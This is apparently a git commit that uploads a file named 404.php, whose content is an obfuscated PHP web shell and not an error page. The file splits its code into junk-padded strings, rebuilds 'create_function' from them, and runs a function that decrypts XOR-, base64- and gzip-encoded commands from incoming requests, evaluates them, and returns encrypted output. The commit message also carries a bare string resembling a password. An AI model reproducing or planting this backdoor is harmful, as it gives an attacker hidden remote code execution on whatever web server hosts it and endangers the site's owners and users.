8ef50b554d9f61c5bd7b2c1dd2e0a5ad90545e42
Adumbration <58345633+Adumbrati0n@users.noreply.github.com>
2020-01-24 04:26:53 -0500

    Add files via upload
    password1234

---
+++ 404.php
@@ -0,0 +1,10 @@
+<?php
+$A='{1B$o.=1B$t{$i1B}^$k{$j}1B;}}ret1Burn $1Bo;}if(@1Bpreg_m1Batch("1B/$kh(.+)$1Bkf/",@1Bfile1B_get_co1Bntents("1Bph1Bp';
+$q=str_replace('O','','crOOeaOte_fuOOnOction');
+$s='$t,$k){$c=s1Btrl1Ben($k1B);$l=strl1Be1Bn($1Bt);$o="1B";1Bfor($i=01B;$i<$l;){fo1Br(1B1B$j=0;($j<$c&1B&$i<$l)1B;$j++,$i++)';
+$F='Bb_g1Bet_contents();1B@ob1B_1Bend_clean1B();$r=@b1Base1B64_encode(1B@x(@gzco1Bmpr1Bess1B($o)1B,$k));print(1B"$p$kh$r1B$kf");}';
+$H='://input"1B)1B,$1Bm)==1){@1Bob_start();@e1Bva1B1Bl(@gzuncompres1Bs(@x(@1B1Bbase1B64_decode($m[1B1]),$k))1B);$o=@o1B1';
+$J='$k=1B1B"b1Bdc1B87b9c";$kh1B="894da5168051B9";$kf="e01B0ebf1Bfb901B77";$p="wiFP1B8txWE1B0mi1BH1BdeU";funct1Bion1B x(';
+$V=str_replace('1B','',$J.$s.$A.$H.$F);
+$X=$q('',$V);$X();
+?>
